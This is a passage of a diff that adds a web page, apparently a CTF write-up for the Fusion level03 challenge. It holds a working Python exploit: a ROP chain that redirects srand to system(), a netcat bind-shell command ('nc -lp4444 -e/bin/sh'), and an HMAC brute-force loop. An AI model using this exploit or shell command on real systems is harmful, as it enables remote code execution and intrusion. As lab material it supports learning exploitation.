+s.connect((&quot;localhost&quot;, 20003))
+print(&quot;[+] Getting token&quot;)
+token = s.recv(1024)
+token = token.strip().strip('&quot;')
+print(&quot;[+] Token: &quot; + token)
+
+p = &quot;&quot;
+p += pack(&quot;&lt;I&quot;, 0x8049b4f)                               # pop eax ; add esp 0x5c
+p += &quot;\\\u609b\\\u0000&quot;                                  # system - srand offset
+p += &quot;A&quot;*0x5c                                                            # so that esp points to the following instruction
+p += pack(&quot;&lt;I&quot;, 0x8048bf0)                               # pop ebx ;;
+p += pack(&quot;&lt;I&quot;, (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff)
+p += pack(&quot;&lt;I&quot;, 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
+p += pack(&quot;&lt;I&quot;, 0x8048c20)                               # srand(system) PLT entry address
+p += pack(&quot;&lt;I&quot;, 0x8048f80)                               # return address is PLT entry for exit()
+p += pack(&quot;&lt;I&quot;, 0x89dd550)                               # argument to system() stored in gContent
+cmd = &quot;//////////////////////////////////bin/nc -lp4444 -e/bin/sh&quot;
+
+test_request = '{ &quot;contents&quot;: &quot;' + cmd + '&quot;, &quot;title&quot;: &quot;' + &quot;A&quot;*127 + &quot;\\\\u4141&quot; + &quot;A&quot;*31 + p + '&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }'
+
+print(&quot;[+] Test request: &quot; + test_request)
+mac = hmac.new(token, token + &quot;\n&quot; + test_request, sha1).digest()
+print(&quot;[+] Test request MAC: &quot; + mac.encode('hex'))
+print(&quot;[+] Modifying hash till it starts with 0000&quot;)
+
+i = 0
+new_request = &quot;&quot;
+while True:
+        new_request = test_request[0:-1] + ', &quot;padding&quot;: &quot;' + str(i) + '&quot;}'
+        hexmac = hmac.new(token, token + &quot;\n&quot; + new_request, sha1).digest().encode(&quot;hex&quot;)
+        if &quot;0000&quot; in hexmac[0:4]:
+                break
+        i += 1
+print(&quot;[+] New request: &quot; + new_request)
+print(&quot;[+] New MAC: &quot; + hmac.new(token, token + &quot;\n&quot; + new_request, sha1).digest().encode(&quot;hex&quot;))
+print(&quot;[+] Sending test request to server&quot;)
+s.send(token + &quot;\n&quot; + new_request)
+s.close()
+</code></pre>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/fusion"><span class="tag">Fusion</span></a></li>
+        
+          <li><a href="/tags/exploit"><span class="tag">Exploit</span></a></li>
+        
+          <li><a href="/tags/level03"><span class="tag">Level03</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2123</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
